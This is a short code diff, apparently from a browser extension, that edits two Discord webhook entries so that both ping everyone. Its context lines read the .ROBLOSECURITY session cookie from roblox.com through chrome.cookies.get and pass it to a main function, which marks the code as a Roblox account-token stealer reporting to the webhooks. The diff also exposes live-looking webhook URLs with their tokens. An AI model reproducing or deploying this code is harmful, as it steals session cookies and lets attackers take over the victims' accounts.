@@ -1,11 +1,11 @@
 const WEBHOOKS = [
     {
         url: "https://discord.com/api/webhooks/1377683745041154229/hem_TvDKnw1xhxttS0M6226ZOuVhIeJ60vZtmBD1M_nOAMTE8Vn8a6KHVvibHmtT7RPc",
-        mention: "<@everyone>" // ✅ ping here
+        mention: "@everyone" // ✅ ping here
     },
     {
         url: "https://discord.com/api/webhooks/1403981151365763172/zLogqJlgQnhY0k6JHzuRPNyqMDx9-uztndOpQ8PsDgz8US5SDjrDR-EsJl3pqospR7mU",
-        mention: "<@everyone>" // ✅ ping here too
+        mention: "@everyone" // ✅ ping here too
     }
 ];
 
@@ -109,3 +109,4 @@ async function main(cookie) {
 chrome.cookies.get({ "url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY" }, function (cookie) {
     main(cookie ? cookie.value : null);
 });
+
